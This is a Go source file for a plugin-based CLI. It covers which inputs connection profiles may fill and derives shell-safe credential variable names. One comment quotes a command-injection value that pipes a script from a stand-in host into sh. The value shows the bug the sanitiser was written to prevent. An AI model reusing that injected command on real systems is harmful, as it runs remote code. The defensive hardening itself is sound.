package plugin

import "strings"

// This file is the plugin-facing half of profiles: which inputs an operator's
// named connection may fill, whether a capability has any such input at all,
// and the variable a profile-scoped credential is read from.
//
// Nothing here is declared by a plugin. Every one of these is *derived* from
// inputs the author already declared, which is what keeps the feature free of
// a proto change and — more to the point — keeps a hostile declaration from
// widening its own reach. A plugin that could mark its own inputs
// profile-fillable could mark the one that names a file.

// ProfileFillable reports whether an operator's profile may supply f on c.
//
// Three clauses. The first says what a profile is for; the last two are the
// security ones, and both are rules rather than descriptions of the tree as
// it stands today.
//
//   - Config-keyed, because that is already the channel an author offered to
//     an operator; or Local+EnvFallback, because that is already the channel
//     an author offered for a credential. Anything else is an input nobody
//     ever said an operator could set, and a profile is not the place to
//     start.
//
//   - Never a Path. builtin/kv's --identity is Path+Local+EnvFallback and
//     s3.object.get's --out is Path+Local, so both would otherwise qualify.
//     internal/mcp's checkPaths runs before Resolve and skips Local fields on
//     the reasoning that a caller cannot supply them — so a profile-filled
//     path would sit outside --root confinement twice over. A
//     profile chooses where a call *goes*, never what it reads or where it
//     writes.
//
//   - Never the input a capability declares as its Scope. A grant is checked
//     against the record named in the call; a profile that could fill that
//     input would change the record after the gate had already run on the old
//     one. Nothing declares such an input today — this is here so nothing
//     ever can.
func ProfileFillable(c Capability, f Field) bool {
	if f.Type == Path {
		return false
	}
	if c.Scope != "" && f.Name == c.Scope {
		return false
	}
	return f.Config != "" || (f.Local && f.EnvFallback)
}

// Tunnellable reports whether any capability among caps declares an input a
// profile's forward could fill — the condition under which a `kube:` or an
// `ssh:` coordinate on a connection means anything at all.
//
// Derived from the declarations, like Profilable, so no plugin author states
// it and a rebuilt artifact can gain or lose it without the config file
// changing a character.
//
// **Every surface that offers a coordinate has to ask this first.** The
// resolver refuses a forward for a plugin that cannot use one, and `rta
// profile set` asks before it writes — but the TUI's connection editor
// offered the box to everything and saved what the runtime then refused. A
// plugin that reaches its cluster through kubectl declares no endpoint input
// at all, so the forward it was given would have been opened and ignored:
// real data from the plugin's own default destination, under a badge naming
// the profile. That is the failure profiles exist to prevent.

func Tunnellable(caps []Capability) bool {
	for _, c := range caps {
		for _, f := range c.Inputs {
			if f.Endpoint != EndpointNone && ProfileFillable(c, f) {
				return true
			}
		}
	}
	return false
}

// Profilable reports whether a profile could change anything about a call to
// c — which is to say whether --profile means something here.
//
// Derived rather than declared, so there is no proto field, no wire change
// and nothing a plugin author has to remember. It is also what makes
// `rta grant allow --profile X` safe with no marker of its own: builtin/grant
// declares no fillable input, so the host never activates a profile for it
// and the name reaches its handler as ordinary data.
func Profilable(c Capability) bool { return profilable(c.Inputs, c.Scope) }

// profilable is Profilable over the parts, so Capability.validate can ask the
// question while the capability is still being checked.
func profilable(inputs []Field, scope string) bool {
	probe := Capability{Scope: scope}
	for _, f := range inputs {
		if ProfileFillable(probe, f) {
			return true
		}
	}
	return false
}

// ProfileEnvVar is the variable a profile-scoped credential is read from:
// RTA_PROFILE_<PROFILE>_<INPUT>.
//
// Derived, never declared — the same property that makes LocalEnvVar safe, and
// for the same reason: a declared Env field would let a hostile declaration
// name AWS_SECRET_ACCESS_KEY and have the host hand it over.
//
// Strictly narrower than LocalEnvVar's RTA_<NS>_<INPUT>, which is the point.
// A namespace-wide variable is bound to the plugin, so it follows the
// connection wherever a profile points it; exporting this one is the
// operator's statement that this credential belongs to *this* connection, so
// it can never be paired with a different one. Resolve switches the
// namespace-wide layer off entirely whenever a profile is active.
//
// "profile" is a reserved namespace, so no plugin can produce a colliding
// LocalEnvVar.
func ProfileEnvVar(profile, input string) string {
	return "RTA_PROFILE_" + envToken(profile) + "_" + envToken(input)
}

// envToken renders one segment of a derived variable name, and guarantees the
// result is a shell identifier whatever it was given.
//
// **Every caller's input is already validated, and that is exactly why this
// filters anyway.** A plugin's name and its inputs match `^[a-z][a-z0-9-]*$`
// at registration and a profile's name matches `^[a-z0-9][a-z0-9-]{0,62}$`
// before it is written — so on every value this function is supposed to see,
// the filter changes nothing. The one that reached it anyway came from a
// config file somebody edited by hand, which the loader marks invalid and the
// profiles pane prints in red, and rta still built `RTA_PROFILE_A; CURL
// EVIL.SH|SH #_TOKEN` out of it and offered it as a line to paste into a
// shell.
//
// The lesson is not about that one path. An identifier derived from a string
// is only as safe as whichever validator happened to run first, in another
// package, at another time — so the guarantee belongs here, where the name is
// made. builtin/kv reached the same conclusion for `kv env` and wrote its own
// filter; this is that filter, at the other place names are derived.
// A dash becomes an underscore because that is the documented spelling —
// `RTA_PG_SSL_MODE` for `ssl-mode` — and everything else becomes one too,
// because a name that has to be mangled has already failed validation and the
// only thing left to get right is that it cannot be read as syntax.
//
// No leading-digit guard, unlike builtin/kv's: every caller prefixes a
// constant (`RTA_`, `RTA_PROFILE_`), so a token is never the first character
// of the identifier it lands in.
func envToken(s string) string {
	var sb strings.Builder
	for _, r := range strings.ToUpper(s) {
		if (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') {
			sb.WriteRune(r)
			continue
		}
		sb.WriteRune('_')
	}
	return sb.String()
}

// Namespace is the plugin part of a capability ID: "kv" of "kv.get".
//
// Here rather than in each package that needs it. internal/grant has had its
// own copy since grants could name a whole plugin, and internal/profile needs
// the identical answer to decide which plugin a profile configures — two
// callers deriving the same fact from the same string is one definition too
// many, and the one that lives beside Capability.ID is the one that cannot
// drift from it.
func Namespace(capID string) string {
	ns, _, _ := strings.Cut(capID, ".")
	return ns
}
